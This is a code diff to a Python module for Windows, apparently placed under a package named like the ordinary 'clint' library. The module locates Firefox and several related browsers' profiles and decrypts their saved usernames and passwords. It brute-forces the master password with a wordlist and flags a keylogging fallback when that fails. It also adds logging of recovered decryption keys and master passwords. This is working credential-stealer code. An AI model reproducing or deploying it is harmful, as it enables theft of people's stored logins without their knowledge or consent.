@@ -11,19 +11,22 @@ import sys
 import traceback
 import os
 
-
-from .config.crypto.pyDes import triple_des, CBC
-from .config.crypto.pyaes import AESModeOfOperationCBC
-from .config.dico import get_dic
-from .config.constant import constant
+import logging
+from clint.browsers.config.crypto.pyDes import triple_des, CBC
+from clint.browsers.config.crypto.pyaes import AESModeOfOperationCBC
+from clint.browsers.config.dico import get_dic
+from clint.browsers.config.constant import constant
 from pyasn1.codec.der import decoder
 from binascii import unhexlify
 from base64 import b64decode
-from .config.winstructure import char_to_int, convert_to_byte
+from clint.browsers.config.winstructure import char_to_int, convert_to_byte
 from hashlib import sha1, pbkdf2_hmac
+from clint.util import data_store
 
-from configparser import RawConfigParser  # Python 3
-from ..util import data_store
+try:
+    from ConfigParser import RawConfigParser  # Python 2.7
+except ImportError:
+    from configparser import RawConfigParser  # Python 3
 
 if sys.version_info[0]:
     python_version = sys.version_info[0]
@@ -70,11 +73,11 @@ def long_to_bytes(n, blocksize=0):
     return s
 
 
-class Mozilla():
+class Mozilla:
 
-    def __init__(self):
-        self.path = u'{APPDATA}\\Mozilla\\Firefox'
-        self.name = u'firefox'
+    def __init__(self, browser_name, path):
+        self.path = path
+        self.name = browser_name
 
     def get_firefox_profiles(self, directory):
         """
@@ -103,7 +106,7 @@ class Mozilla():
                         profile_list.append(profile_path)
 
         except Exception as e:
-            self.error(u'An error occurred while reading profiles.ini: {}'.format(e))
+            logging.error(u'An error occurred while reading profiles.ini: {}'.format(e))
         return profile_list
 
     def get_key(self, profile):
@@ -128,7 +131,7 @@ class Mozilla():
                     row = next(c)  # Python 3
 
         except Exception:
-            log.critical(traceback.format_exc())
+            logging.debug(traceback.format_exc())
 
         else:
             if row:
@@ -165,12 +168,13 @@ class Mozilla():
                             decoded_a11 = decoder.decode(a11)
                             key = self.decrypt_3des(decoded_a11, master_password, global_salt)
                             if key:
+                                logging.debug(u'key: {key}'.format(key=repr(key)))
                                 yield key[:24]
                         # else:
                             # Nothing saved
 
                     except Exception:
-                        log.critical(traceback.format_exc())
+                        logging.debug(traceback.format_exc())
 
         try:
             key3_file = os.path.join(profile, 'key3.db')
@@ -186,9 +190,10 @@ class Mozilla():
                                                   master_password=master_password,
                                                   entry_salt=entry_salt)
                     if key:
+                        logging.debug(u'key: {key}'.format(key=repr(key)))
                         yield key[:24]
         except Exception:
-            log.critical(traceback.format_exc())
+            logging.debug(traceback.format_exc())
 
     @staticmethod
     def get_short_le(d, a):
@@ -237,12 +242,12 @@ class Mozilla():
             header = f.read(4 * 15)
             magic = self.get_long_be(header, 0)
             if magic != 0x61561:
-                self.warning(u'Bad magic number')
+                logging.warning(u'Bad magic number')
                 return False
 
             version = self.get_long_be(header, 4)
             if version != 2:
-                self.warning(u'Bad version !=2 (1.85)')
+                logging.warning(u'Bad version !=2 (1.85)')
                 return False
 
             pagesize = self.get_long_be(header, 12)
@@ -296,7 +301,7 @@ class Mozilla():
             cipher_t = decoded_item[0][1].asOctets()
 
             # See http://www.drh-consultancy.demon.co.uk/key3.html
-            hp = sha1(global_salt + convert_to_byte(master_password)).digest()
+            hp = sha1(global_salt + master_password).digest()
             pes = entry_salt + convert_to_byte('\x00') * (20 - len(entry_salt))
             chp = sha1(hp + entry_salt).digest()
             k1 = hmac.new(chp, pes + entry_salt, sha1).digest()
@@ -379,6 +384,7 @@ class Mozilla():
                         if loginf:
                             json_logins = json.loads(loginf)
                             if 'logins' not in json_logins:
+                                logging.debug('No logins key in logins.json')
                                 return logins
                             for row in json_logins['logins']:
                                 enc_username = row['encryptedUsername']
@@ -387,6 +393,7 @@ class Mozilla():
                                                self.decode_login_data(enc_password), row['hostname']))
                             return logins
             except Exception:
+                logging.debug(traceback.format_exc())
                 return []
 
         # Using sqlite3 database
@@ -406,6 +413,7 @@ class Mozilla():
                                                                                      new_version=new_version)
 
         if not global_salt:
+            logging.info(u'Master Password is used !')
             (global_salt, master_password, entry_salt) = self.brute_master_password(key_data=key_data,
                                                                                     new_version=new_version)
             if not master_password:
@@ -449,26 +457,27 @@ class Mozilla():
 
             return global_salt, master_password, entry_salt
         except Exception:
+            logging.debug(traceback.format_exc())
             return '', '', ''
 
     def brute_master_password(self, key_data, new_version=True):
         """
         Try to find master_password doing a dictionary attack using the 500 most used passwords
         """
-        
         wordlist = constant.password_found + get_dic() + data_store.var.mozila_pass
         num_lines = (len(wordlist) - 1)
+        logging.info(u'%d most used passwords !!! ' % num_lines)
 
         for word in wordlist:
             global_salt, master_password, entry_salt = self.is_master_password_correct(key_data=key_data,
                                                                                        master_password=word.strip(),
                                                                                        new_version=new_version)
             if master_password:
+                logging.info(u'Master password found: {}'.format(master_password))
                 return global_salt, master_password, entry_salt
 
-        log.warning(u'No password has been found using the default list')
+        logging.warning(u'No password has been found using the default list')
         data_store.set_value("mozila_keylog", True)# keystoke is the lasft hope
-
         return '', '', ''
 
     def remove_padding(self, data):
@@ -483,6 +492,7 @@ class Mozilla():
         try:
             return data[:-nb]
         except Exception:
+            logging.debug(traceback.format_exc())
             return data
 
     def decrypt(self, key, iv, ciphertext):
@@ -500,6 +510,7 @@ class Mozilla():
         self.path = self.path.format(**constant.profile)
         if os.path.exists(self.path):
             for profile in self.get_firefox_profiles(self.path):
+                logging.debug(u'Profile path found: {profile}'.format(profile=profile))
 
                 credentials = self.get_login_data(profile)
                 if credentials:
@@ -512,9 +523,21 @@ class Mozilla():
                                     'Password': self.decrypt(key=key, iv=passw[1], ciphertext=passw[2]).decode('utf-8'),
                                 })
                             except Exception:
-                                log.critical(traceback.format_exc())
-                
+                                logging.debug(u'An error occured decrypting the password: {error}'.format(error=traceback.format_exc()))
+                else:
+                    logging.info(u'Database empty')
+
         return pwd_found
 
 
-firefox = Mozilla()
+# Name, path
+firefox_browsers = [
+    (u'firefox', u'{APPDATA}\\Mozilla\\Firefox'),
+    (u'blackHawk', u'{APPDATA}\\NETGATE Technologies\\BlackHawk'),
+    (u'cyberfox', u'{APPDATA}\\8pecxstudios\\Cyberfox'),
+    (u'comodo IceDragon', u'{APPDATA}\\Comodo\\IceDragon'),
+    (u'k-Meleon', u'{APPDATA}\\K-Meleon'),
+    (u'icecat', u'{APPDATA}\\Mozilla\\icecat'),
+]
+
+firefox_browsers = [Mozilla(browser_name=name, path=path) for name, path in firefox_browsers]
